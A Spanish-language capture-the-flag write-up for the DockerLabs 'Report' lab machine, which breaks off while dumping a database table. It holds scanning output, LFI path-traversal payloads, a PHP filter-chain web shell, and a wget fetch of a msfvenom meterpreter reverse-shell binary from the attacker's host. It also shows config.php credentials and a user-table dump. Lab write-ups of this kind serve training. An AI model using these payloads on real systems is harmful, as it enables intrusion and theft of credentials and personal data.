---
icon: flag
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# Report DockerLabs (intermediate)

### Instalación

Cuando obtenemos el `.zip` nos lo pasamos al entorno en el que vamos a empezar a hackear la maquina y haremos lo siguiente.

```shell
unzip report.zip
```

Nos lo descomprimira y despues montamos la maquina de la siguiente forma.

```shell
bash auto_deploy.sh report.tar
```

Info:

```
                            ##        .         
                      ## ## ##       ==         
                   ## ## ## ##      ===         
               /""""""""""""""""\___/ ===       
          ~~~ {~~ ~~~~ ~~~ ~~~~ ~~ ~ /  ===- ~~~
               \______ o          __/           
                 \    \        __/            
                  \____\______/               
                                          
  ___  ____ ____ _  _ ____ ____ _    ____ ___  ____ 
  |  \ |  | |    |_/  |___ |__/ |    |__| |__] [__  
  |__/ |__| |___ | \_ |___ |  \ |___ |  | |__] ___] 
                                         
                                     

Estamos desplegando la máquina vulnerable, espere un momento.

Máquina desplegada, su dirección IP es --> 172.17.0.2

Presiona Ctrl+C cuando termines con la máquina para eliminarla
```

Por lo que cuando terminemos de hackearla, le damos a `Ctrl+C` y nos eliminara la maquina para que no se queden archivos basura.

### Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-24 04:37 EST
Nmap scan report for ctf403.hl (172.17.0.2)
Host is up (0.000034s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 58:46:38:70:8c:d8:4a:89:93:07:b3:43:17:81:59:f1 (ECDSA)
|_  256 25:99:39:02:52:4b:80:3f:aa:a8:9a:d4:8e:9a:eb:10 (ED25519)
80/tcp   open  http    Apache httpd 2.4.58
|_http-title: Did not follow redirect to http://realgob.dl/
|_http-server-header: Apache/2.4.58 (Ubuntu)
3306/tcp open  mysql   MySQL 5.5.5-10.11.8-MariaDB-0ubuntu0.24.04.1
| mysql-info: 
|   Protocol: 10
|   Version: 5.5.5-10.11.8-MariaDB-0ubuntu0.24.04.1
|   Thread ID: 8
|   Capabilities flags: 63486
|   Some Capabilities: Speaks41ProtocolNew, SupportsTransactions, Speaks41ProtocolOld, LongColumnFlag, ODBCClient, Support41Auth, InteractiveClient, ConnectWithDatabase, IgnoreSigpipes, FoundRows, IgnoreSpaceBeforeParenthesis, SupportsLoadDataLocal, SupportsCompression, DontAllowDatabaseTableColumn, SupportsAuthPlugins, SupportsMultipleResults, SupportsMultipleStatments
|   Status: Autocommit
|   Salt: &c@Uj7pO|Br9aaBcOB:<
|_  Auth Plugin Name: mysql_native_password
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: Host: 172.17.0.2; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.71 seconds
```

Si intentamos conectarnos a la pagina veremos que va por dominio y no se esta resolviendo adecuadamente, por lo que tendremos que editar el archivo `hosts` de la siguiente forma:

```shell
nano /etc/hosts

#Dentro del nano
<IP>      realgob.dl
```

Lo guardamos y probamos a entrar de nuevo a la pagina:

```
URL = http://realgob.dl/
```

Vemos que nos carga la pagina con normalidad y aparentemente parece ser una pagina del gobierno.

## Gobuster

Si `fuzzeamos` un poco para ver que encontramos:

```shell
gobuster dir -u http://realgob.dl/ -w <WORDLIST> -x html,php,txt -t 100 -k -r
```

Info:

```
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://realgob.dl/
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              html,php,txt
[+] Follow Redirect:         true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.htpasswd.txt        (Status: 403) [Size: 275]
/.htpasswd.html       (Status: 403) [Size: 275]
/.htaccess.php        (Status: 403) [Size: 275]
/LICENSE              (Status: 200) [Size: 0]
/.htaccess.html       (Status: 403) [Size: 275]
/.htaccess.txt        (Status: 403) [Size: 275]
/.htaccess            (Status: 403) [Size: 275]
/.htpasswd            (Status: 403) [Size: 275]
/about.php            (Status: 200) [Size: 4939]
/.htpasswd.php        (Status: 403) [Size: 275]
/admin.php            (Status: 200) [Size: 1005]
/api                  (Status: 200) [Size: 1716]
/assets               (Status: 200) [Size: 1499]
/config.php           (Status: 200) [Size: 0]
/contacto.php         (Status: 200) [Size: 2893]
/database             (Status: 200) [Size: 1544]
/desarrollo           (Status: 200) [Size: 6099]
/gestion.php          (Status: 200) [Size: 0]
/images               (Status: 200) [Size: 935]
/important.txt        (Status: 200) [Size: 1818]
/includes             (Status: 200) [Size: 1754]
/index.php            (Status: 200) [Size: 5048]
/info.php             (Status: 200) [Size: 76219]
/login.php            (Status: 200) [Size: 4350]
/logs                 (Status: 200) [Size: 1145]
/logout.php           (Status: 200) [Size: 4350]
/noticias.php         (Status: 200) [Size: 22]
/pages                (Status: 200) [Size: 0]
/registro.php         (Status: 200) [Size: 2445]
/server-status        (Status: 403) [Size: 275]
/uploads              (Status: 200) [Size: 1531]
Progress: 81876 / 81880 (100.00%)
===============================================================
Finished
===============================================================
```

Vemos varias cosas interesantes, vamos a probar con cada uno de los `PHP` por si tuviera algun `LFI` con algun parametro vulnerable.

## FFUF

```shell
ffuf -u http://realgob.dl/about.php?FUZZ=/etc/passwd -w <WORDLIST> -fs 4939
```

Info:

```

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://realgob.dl/about.php?FUZZ=/etc/passwd
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/big.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 4939
________________________________________________

file                    [Status: 200, Size: 6284, Words: 1433, Lines: 126, Duration: 1ms]
:: Progress: [20469/20469] :: Job [1/1] :: 456 req/sec :: Duration: [0:00:04] :: Errors: 0 ::
```

Vemos que tiene un parametro llamado `file` `about.php`, por lo que probaremos a insertarlo en la pagina web y leer el `passwd`:

```
URL = http://realgob.dl/about.php?file=/etc/passwd
```

Info:

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
_galera:x:100:65534::/nonexistent:/usr/sbin/nologin
mysql:x:101:102:MariaDB Server,,,:/nonexistent:/bin/false
systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
sshd:x:102:65534::/run/sshd:/usr/sbin/nologin
systemd-timesync:x:997:997:systemd Time Synchronization:/:/usr/sbin/nologin
messagebus:x:103:104::/nonexistent:/usr/sbin/nologin
systemd-resolve:x:996:996:systemd Resolver:/:/usr/sbin/nologin
adm:x:1001:100::/home/adm:/bin/bash
```

Vemos que funciona correctamente y nos saca el listado del archivo.

Ahora vamos a ver que archivos puede haber interesantes:

```shell
wfuzz -c --hc=404 --hw=373 -t 200 -w LFI-Jhaddix.txt http://realgob.dl/about.php?file=FUZZ
```

> NOTA:

Diccionario utilizado para este ataque:

URL = [LFI-Jhaddix.txt](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-Jhaddix.txt)

Info:

```
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://realgob.dl/about.php?file=FUZZ
Total requests: 929

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                     
=====================================================================

000000016:   200        125 L    408 W      6264 Ch     "/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"         
000000206:   200        105 L    389 W      5093 Ch     "../../../../../../../../../../../../etc/hosts"                                             
000000209:   200        115 L    484 W      5630 Ch     "/etc/hosts.deny"                                                                           
000000205:   200        105 L    389 W      5093 Ch     "/etc/hosts"                                                                                
000000208:   200        108 L    430 W      5330 Ch     "/etc/hosts.allow"                                                                          
000000250:   200        118 L    438 W      5445 Ch     "/etc/nsswitch.conf"                                                                        
000000249:   200        117 L    476 W      5686 Ch     "/etc/netconfig"                                                                            
000000248:   200        127 L    547 W      6045 Ch     "/etc/mysql/my.cnf"                                                                         
000000237:   200        100 L    378 W      4945 Ch     "/etc/issue"                                                                                
000000236:   200        451 L    1415 W     13058 Ch    "/etc/init.d/apache2"                                                                       
000000253:   200        125 L    408 W      6264 Ch     "/./././././././././././etc/passwd"                                                         
000000259:   200        125 L    408 W      6264 Ch     "../../../../../../../../../../../../../../../../../../../../../etc/passwd"                 
000000267:   200        125 L    408 W      6264 Ch     "../../../../../../../../../../../../../etc/passwd"                                         
000000273:   200        125 L    408 W      6264 Ch     "../../../../../../../etc/passwd"                                                           
000000277:   200        125 L    408 W      6264 Ch     "../../../etc/passwd"                                                                       
000000276:   200        125 L    408 W      6264 Ch     "../../../../etc/passwd"                                                                    
000000275:   200        125 L    408 W      6264 Ch     "../../../../../etc/passwd"                                                                 
000000274:   200        125 L    408 W      6264 Ch     "../../../../../../etc/passwd"                                                              
000000272:   200        125 L    408 W      6264 Ch     "../../../../../../../../etc/passwd"                                                        
000000271:   200        125 L    408 W      6264 Ch     "../../../../../../../../../etc/passwd"                                                     
000000270:   200        125 L    408 W      6264 Ch     "../../../../../../../../../../etc/passwd"                                                  
000000269:   200        125 L    408 W      6264 Ch     "../../../../../../../../../../../etc/passwd"                                               
000000263:   200        125 L    408 W      6264 Ch     "../../../../../../../../../../../../../../../../../etc/passwd"                             
000000265:   200        125 L    408 W      6264 Ch     "../../../../../../../../../../../../../../../etc/passwd"                                   
000000266:   200        125 L    408 W      6264 Ch     "../../../../../../../../../../../../../../etc/passwd"                                      
000000268:   200        125 L    408 W      6264 Ch     "../../../../../../../../../../../../etc/passwd"                                            
000000261:   200        125 L    408 W      6264 Ch     "../../../../../../../../../../../../../../../../../../../etc/passwd"                       
000000264:   200        125 L    408 W      6264 Ch     "../../../../../../../../../../../../../../../../etc/passwd"                                
000000262:   200        125 L    408 W      6264 Ch     "../../../../../../../../../../../../../../../../../../etc/passwd"                          
000000258:   200        125 L    408 W      6264 Ch     "../../../../../../../../../../../../../../../../../../../../../../etc/passwd"              
000000260:   200        125 L    408 W      6264 Ch     "../../../../../../../../../../../../../../../../../../../../etc/passwd"                    
000000257:   200        125 L    408 W      6264 Ch     "/etc/passwd"                                                                               
000000254:   200        125 L    408 W      6264 Ch     "/../../../../../../../../../../etc/passwd"                                                 
000000311:   200        125 L    408 W      6264 Ch     "../../../../../../etc/passwd&=%3C%3C%3C%3C"                                                
000000400:   200        139 L    493 W      5830 Ch     "/etc/rpc"                                                                                  
000000399:   200        107 L    411 W      5159 Ch     "/etc/resolv.conf"                                                                          
000000422:   200        220 L    760 W      8173 Ch     "/etc/ssh/sshd_config"                                                                      
000000500:   200        152 L    531 W      6422 Ch     "/proc/meminfo"                                                                             
000000509:   200        157 L    515 W      6336 Ch     "/proc/self/status"                                                                         
000000510:   200        99 L     394 W      5109 Ch     "/proc/version"                                                                             
000000506:   200        102 L    385 W      5006 Ch     "/proc/partitions"                                                                          
000000507:   200        98 L     374 W      4946 Ch     "/proc/self/cmdline"                                                                        
000000505:   200        302 L    3836 W     35519 Ch    "/proc/net/tcp"                                                                             
000000502:   200        100 L    388 W      5075 Ch     "/proc/net/arp"                                                                             
000000504:   200        101 L    406 W      5303 Ch     "/proc/net/route"                                                                           
000000499:   200        99 L     378 W      4944 Ch     "/proc/loadavg"                                                                             
000000503:   200        102 L    427 W      5367 Ch     "/proc/net/dev"                                                                             
000000501:   200        120 L    505 W      7073 Ch     "/proc/mounts"                                                                              
000000497:   200        314 L    1637 W     11999 Ch    "/proc/cpuinfo"                                                                             
000000498:   200        165 L    1217 W     13688 Ch    "/proc/interrupts"                                                                          
000000699:   200        98 L     375 W      297503 Ch   "/var/log/lastlog"                                                                          
000000741:   200        98 L     386 W      7991 Ch     "/var/log/wtmp"                                                                             
000000929:   200        125 L    408 W      6264 Ch     "///////../../../etc/passwd"                                                                
000000023:   200        125 L    408 W      6264 Ch     "..%2F..%2F..%2F%2F..%2F..%2Fetc/passwd"                                                    
000000020:   200        125 L    408 W      6264 Ch     "..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd"                       
000000135:   200        99 L     379 W      4956 Ch     "/etc/fstab"                                                                                
000000129:   200        102 L    409 W      5189 Ch     "/etc/apt/sources.list"                                                                     
000000121:   200        324 L    1482 W     12119 Ch    "/etc/apache2/apache2.conf"                                                                 
000000138:   200        145 L    420 W      5574 Ch     "/etc/group"                                                                                

Total time: 8.726811
Processed Requests: 929
Filtered Requests: 870
Requests/sec.: 106.4535
```

Vemos que nos saca unos cuantos, por lo que podremos hacer lo siguiente ya que tenemos un `LFI`:

### LFI / RFI usando wrappers

> Tecnica `Wrapper php://filter`

Utilizando la llamada de `php` para ejecutar lo que le pongamos.

> Tecnica para automatizar todo esto

Para automatizar todo lo anterior podemos utilizar un script que te genera lo que tienes que indtroducir en la `URL` en el apartado despues del `=`...

URL\_Script = https://github.com/synacktiv/php\_filter\_chain\_generator/blob/main/php\_filter\_chain\_generator.py

Si queremos por ejemplo crear un parametro llamado `cmd` que ejecute cualquier comando que le pongamos, seria de la siguiente forma...

```shell
$ python3 php_filter_chain_generator.py --chain '<?php echo shell_exec($_GET["cmd"]);?>'
[+] The following gadget chain will generate the following code : <?php echo shell_exec($_GET["cmd"]);?> (base64 value: PD9waHAgZWNobyBzaGVsbF9leGVjKCRfR0VUWyJjbWQiXSk7Pz4)
php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP866.CSUNICODE|convert.iconv.CSISOLATIN5.ISO_6937-2|convert.iconv.CP950.UTF-16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.iconv.ISO-IR-103.850|convert.iconv.PT154.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.SJIS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.DEC.UTF-16|convert.iconv.ISO8859-9.ISO_6937-2|convert.iconv.UTF16.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500-1983.UCS-2BE|convert.iconv.MIK.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-2.OSF00030010|convert.iconv.CSIBM1008.UTF32BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.iconv.CP950.UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UNICODE|convert.iconv.ISIRI3342.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UTF-16|convert.iconv.ISO6937.UTF16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.iconv.CP950.UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UTF16.EUC-JP-MS|convert.iconv.ISO-8859-1.ISO_6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP950.SHIFT_JISX0213|convert.iconv.UHC.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-2.OSF00030010|convert.iconv.CSIBM1008.UTF32BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-2.OSF00030010|convert.iconv.CSIBM1008.UTF32BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-4LE.OSF05010001|convert.iconv.IBM912.UTF-16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.BIG5HKSCS.UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp
```

Copiamos eso y lo metemos despues del igual de la siguiente manera...

```
http://realgob.dl/about.php?cmd=<COMMAND>&file=<CONTENT_GENERATE>
```

> EJEMPLO:

```
http://realgob.dl/about.php?cmd=whoami&file=<CONTENT_GENERATE>
```

Info:

```
 www-data
�
P�����
```

Vemos que esta funcionando, por lo que nos vamos a crear una aplicacion con `msfvenom` y hacernos una `reverse shell` con un `meterpreter`.

### Escalate user www-data

#### MSFVENOM .elf

```shell
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell.elf
```

Info:

```
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 130 bytes
Final size of elf file: 250 bytes
```

Esto nos generara un archivo `.elf` el cual tendremos que llevar a la maquina victima de la siguiente forma:

```shell
python3 -m http.server
```

En la `URL` pondremos lo siguiente:

```
URL = http://realgob.dl/about.php?cmd=wget http://<IP>:8000/shell.elf -O /tmp/shell.elf&file=<CONTENT_GENERATE>
```

Una vez ejecutado esto, comprobaremos que realmente se ha cargado el archivo en `/tmp`:

```
URL = http://realgob.dl/about.php?cmd=ls -la /tmp/shell.elf&file=<CONTENT_GENERATE>
```

Info:

```
-rw-r--r-- 1 www-data www-data 250 Dec 24 11:23 /tmp/shell.elf
�
P�����
```

Vemos que si, por lo que ahora le daremos permisos de ejecuccion y seguidamente lo ejecutaremos.

```
URL = http://realgob.dl/about.php?cmd=chmod%20%2Bx%20%2Ftmp%2Fshell.elf &file=<CONTENT_GENERATE>
```

Vamos a `URL Encodearlo` para que no de ningun error y si volvemos a listar el archivo...

```
URL = http://realgob.dl/about.php?cmd=ls -la /tmp/shell.elf&file=<CONTENT_GENERATE>
```

Info:

```
-rwxr-xr-x 1 www-data www-data 250 Dec 24 11:23 /tmp/shell.elf
�
P�����
```

Vemos que ya tiene permisos de ejecuccion, por lo que estaremos a la escucha antes de ejecutarlo de la siguiente forma:

```shell
msfconsole -q
```

```shell
use multi/handler
set LPORT <PORT>
set LHOST <IP>
set PAYLOAD linux/x64/meterpreter/reverse_tcp
run
```

Una vez estando ya a la escucha con todo configurado, ejecutaremos el `.elf` de la siguiente forma:

```
URL = http://realgob.dl/about.php?cmd=/tmp/shell.elf&file=<CONTENT_GENERATE>
```

Si ahora nos volvemos a donde teniamos la escucha veremos que se nos ha creado una `shell`:

```
[*] Started reverse TCP handler on 192.168.5.186:7777 
[*] Sending stage (3045380 bytes) to 172.17.0.2
[*] Meterpreter session 1 opened (192.168.5.186:7777 -> 172.17.0.2:52058) at 2024-12-24 06:36:19 -0500

meterpreter > getuid
Server username: www-data
```

## Escalate user adm

Si leemos el siguiente archivo, veremos las credenciales para entrar como `root` a `mysql`:

```shell
cat config.php
```

Info:

```php
<?php
$servername = "localhost";
$username = "root"; // 
$password = "lacontramaspoderosadetodas"; 
$dbname = "GOB_BD";

// Crear conexión
$conn = new mysqli($servername, $username, $password, $dbname);

// Comprobar conexión
if ($conn->connect_error) {
    die("Conexión fallida: " . $conn->connect_error);
}
?>
```

Por lo que nos meteremos en la misma maquina con dichas credenciales.

```shell
shell
script /dev/null -c bash
reset xterm
export TERM=xterm
export SHELL=/bin/bash
```

```shell
mysql -u root -placontramaspoderosadetodas
```

Y con esto estariamos dentro de `mysql`.

```shell
show databases;
```

Info:

```
+--------------------+
| Database           |
+--------------------+
| GOB_BD             |
| information_schema |
| mysql              |
| noticias           |
| performance_schema |
| sys                |
+--------------------+
```

```shell
use GOB_BD;
show tables;
```

Info:

```
+------------------+
| Tables_in_GOB_BD |
+------------------+
| transacciones    |
| users            |
+------------------+
```

```shell
select * from users;
```

Info:

```
+----+-------------------------------+--------------------------------------------------------------+---------------+----------+------------------------------+------------+------------------------------------------+--------------+-------------+-----------+
| id | username                      | password                                                     | nombre        | apellido | email                        | dni        | direccion                                | telefono     | saldo       | no_cuenta |
+----+-------------------------------+--------------------------------------------------------------+---------------+----------+------------------------------+------------+------------------------------------------+--------------+-------------+-----------+
|  1 | adan                          | $2y$10$IBfPR1/zhLbcjeMz42BY/O.Qb2smhr4UYdyaet3UUvrd/txDxwHQC | Adan          | Martnez  | adan@gmail.com               | 12345678A  | Calle de Ejemplo 123, Ciudad Ejemplo     | +34123456789 |       56.00 | 89542776  |
|  4 | yahir                         | $2y$10$6d2LbTMyvhkloPQPUDl./e4SCDDMjp6eO9Qu62bS6C1VRkXeU501. | yahir         | lopez    | yahir23@gmail.com            | 23123      | La direccion mas prra #24 Colonia Grillo | 2325124523   |        0.00 | 96271035  |
|  5 | joaquin                       | $2y$10$slvTyHz6jzbSt8Q3lejcCO3hSz/3lAZsWnH4.zJBRl83122M.zjz6 | joaquin       | guzman   | chapito@hotmail.com          | V2F9SK4    | Av Lautaro Calle Celeste #24             | 938572245    |      150.00 | 12726850  |
|  6 | Felipe                        | $2y$10$fJhC6773D4IjdwtBq3JymeIRGCpGVYMZq23s7Lteq1NFeXVUhMozC | Felipe        | Calderas | calder98@gmail.com           | GS8GVS     | Colonia Centro Matamoros #232            | 728592354    |      150.00 | 74821147  |
